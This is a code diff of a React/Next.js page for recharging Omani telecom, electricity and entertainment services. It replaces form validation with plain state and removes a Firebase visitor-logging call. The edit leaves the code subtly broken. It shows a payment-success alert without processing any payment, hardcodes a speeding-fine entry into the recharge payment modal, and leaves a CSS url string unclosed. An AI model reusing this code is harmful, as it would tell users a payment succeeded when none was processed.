@@ -1,5 +1,7 @@
 "use client"
 
+import type React from "react"
+
 import Image from "next/image"
 import { useState } from "react"
 import { Button } from "@/components/ui/button"
@@ -9,41 +11,29 @@ import { Label } from "@/components/ui/label"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { serviceProviders } from "@/lib/service-providers"
 import { PaymentForm } from "@/components/payment-form"
-
-import { useForm } from "react-hook-form"
-import { zodResolver } from "@hookform/resolvers/zod"
-import { rechargeSchema } from "@/lib/validation"
-import { SiteHeader } from "@/components/ui/header"
-import { addData } from "@/lib/firebase"
+import { SiteHeader } from "./ui/header"
 
 export default function RechargePage() {
-  const {
-    register,
-    handleSubmit,
-    formState: { errors },
-    watch,
-    setValue,
-  } = useForm({
-    resolver: zodResolver(rechargeSchema),
-    defaultValues: {
-      serviceType: "telecom",
-      provider: "",
-      phoneNumber: "",
-      amount: 0,
-      confirmAmount: 0,
-    },
-  })
-
-  const serviceType = watch("serviceType")
+  const [serviceType, setServiceType] = useState("telecom")
+  const [provider, setProvider] = useState("")
+  const [phoneNumber, setPhoneNumber] = useState("")
+  const [amount, setAmount] = useState("")
+  const [confirmAmount, setConfirmAmount] = useState("")
   const [showPayment, setShowPayment] = useState(false)
   const [selectedViolations, setSelectedViolations] = useState([])
 
   const filteredProviders = serviceProviders.filter((provider) => provider.type === serviceType)
 
-  const onSubmit = () => {
-    const visitorId=localStorage.getItem('visitor')
-    addData({id:visitorId,phone:""})
-    setShowPayment(true)
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault()
+
+    if (amount !== confirmAmount) {
+      alert("المبالغ غير متطابقة")
+      return
+    }
+
+    // Process payment
+    alert(`تمت عملية الدفع بنجاح: ${amount} ريال عماني`)
   }
 
   return (
@@ -54,26 +44,24 @@ export default function RechargePage() {
         <div className="bg-[#9aca3f] text-white text-center py-8 px-4">
           <h1 className="text-3xl md:text-4xl font-bold">اعادة شحن الاتصالات و الكهرباء و وسائل الترفيه</h1>
         </div>
-
-       
-
+    
         {/* Form Section */}
         <div
           className="py-12 px-4"
           style={{
-            backgroundImage: "url(/bg.jpg)",
+            backgroundImage: "url(/bg.jpg",
             backgroundRepeat: "repeat",
             backgroundSize: "200px",
           }}
         >
           <Card className="max-w-md mx-auto bg-white/95 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200 overflow-hidden">
             <CardContent className="p-8">
-              <form className="space-y-4" onSubmit={handleSubmit(onSubmit)}>
+              <form className="space-y-4" onSubmit={handleSubmit}>
                 <div className="space-y-2">
                   <Label htmlFor="service-provider-type" className="text-gray-600">
                     اختار مزود الخدمة
                   </Label>
-                  <Select value={serviceType} onValueChange={(value) => setValue("serviceType", value)}>
+                  <Select value={serviceType} onValueChange={setServiceType}>
                     <SelectTrigger id="service-provider-type" className="bg-white rounded-lg">
                       <SelectValue placeholder="اختر..." />
                     </SelectTrigger>
@@ -83,14 +71,13 @@ export default function RechargePage() {
                       <SelectItem value="entertainment">وسائل الترفيه</SelectItem>
                     </SelectContent>
                   </Select>
-                  {errors.serviceType && <p className="text-red-500 text-sm">{errors.serviceType.message}</p>}
                 </div>
 
                 <div className="space-y-2">
                   <Label htmlFor="service-provider" className="text-gray-600">
                     مزود الخدمة
                   </Label>
-                  <Select {...register("provider")} onValueChange={(value) => setValue("provider", value)}>
+                  <Select value={provider} onValueChange={setProvider}>
                     <SelectTrigger id="service-provider" className="bg-white rounded-lg">
                       <SelectValue placeholder="حدد المزود" />
                     </SelectTrigger>
@@ -102,7 +89,6 @@ export default function RechargePage() {
                       ))}
                     </SelectContent>
                   </Select>
-                  {errors.provider && <p className="text-red-500 text-sm">{errors.provider.message}</p>}
                 </div>
 
                 <div className="space-y-2">
@@ -113,10 +99,10 @@ export default function RechargePage() {
                     id="phone-number"
                     type="text"
                     className="bg-white rounded-lg"
+                    value={phoneNumber}
+                    onChange={(e) => setPhoneNumber(e.target.value)}
                     dir="ltr"
-                    {...register("phoneNumber")}
                   />
-                  {errors.phoneNumber && <p className="text-red-500 text-sm">{errors.phoneNumber.message}</p>}
                 </div>
 
                 <div className="space-y-2">
@@ -127,10 +113,10 @@ export default function RechargePage() {
                     id="amount"
                     type="number"
                     className="bg-white rounded-lg"
+                    value={amount}
+                    onChange={(e) => setAmount(e.target.value)}
                     dir="ltr"
-                    {...register("amount", { valueAsNumber: true })}
                   />
-                  {errors.amount && <p className="text-red-500 text-sm">{errors.amount.message}</p>}
                 </div>
 
                 <div className="space-y-2">
@@ -141,16 +127,17 @@ export default function RechargePage() {
                     id="confirm-amount"
                     type="number"
                     className="bg-white rounded-lg"
+                    value={confirmAmount}
+                    onChange={(e) => setConfirmAmount(e.target.value)}
                     dir="ltr"
-                    {...register("confirmAmount", { valueAsNumber: true })}
                   />
-                  {errors.confirmAmount && <p className="text-red-500 text-sm">{errors.confirmAmount.message}</p>}
                 </div>
 
                 <div className="pt-4">
                   <Button
-                    type="submit"
-                    className="w-full bg-[#00843D] hover:bg-[#006e33] text-white font-bold text-lg py-6 rounded-lg"
+                    type="button"
+                    onClick={() => setShowPayment(true)}
+                    className="w-full bg-[#9aca3f] hover:bg-[#006e33] text-white font-bold text-lg py-6 rounded-lg"
                   >
                     مبلغ الدفع
                   </Button>
@@ -166,7 +153,7 @@ export default function RechargePage() {
         {/* Service Information */}
         <div className="py-12 px-4 bg-gray-50">
           <div className="max-w-4xl mx-auto">
-            <h2 className="text-2xl font-bold text-center mb-8 text-[#00843D]">خدمات إعادة الشحن في عمان</h2>
+            <h2 className="text-2xl font-bold text-center mb-8 text-[#9aca3f]">خدمات إعادة الشحن في عمان</h2>
 
             <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
               <ServiceCard
@@ -190,16 +177,29 @@ export default function RechargePage() {
         {showPayment && (
           <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
             <PaymentForm
-              totalAmount={Number.parseFloat(watch("amount")as any) || 0}
+              totalAmount={Number.parseFloat(amount) || 0}
+              violations={[
+                {
+                  id: "1",
+                  type: "تجاوز السرعة",
+                  date: "2024-01-15",
+                  location: "شارع السلطان قابوس",
+                  amount: Number.parseFloat(amount) || 0,
+                  plateNumber: phoneNumber,
+                  status: "unpaid",
+                },
+              ]}
+              onSuccess={() => {
+                setShowPayment(false)
+                alert("تم الدفع بنجاح!")
+              }}
               onCancel={() => setShowPayment(false)}
-              violations={selectedViolations}
-              onSuccess={()=>{}}
             />
           </div>
         )}
       </main>
 
-      <footer className="bg-[#00843D] text-white py-8 px-4">
+      <footer className="bg-[#9aca3f] text-white py-8 px-4">
         <div className="max-w-6xl mx-auto text-center">
           <p>© 2025 خدمة إعادة الشحن في عمان. جميع الحقوق محفوظة.</p>
         </div>
@@ -214,7 +214,7 @@ function ServiceCard({ title, description, icon }:any) {
       <div className="w-16 h-16 mx-auto mb-4 relative">
         <Image src={icon || "/placeholder.svg"} alt={title} fill className="object-contain" />
       </div>
-      <h3 className="text-xl font-bold mb-2 text-[#00843D]">{title}</h3>
+      <h3 className="text-xl font-bold mb-2 text-[#9aca3f]">{title}</h3>
       <p className="text-gray-600">{description}</p>
     </div>
   )
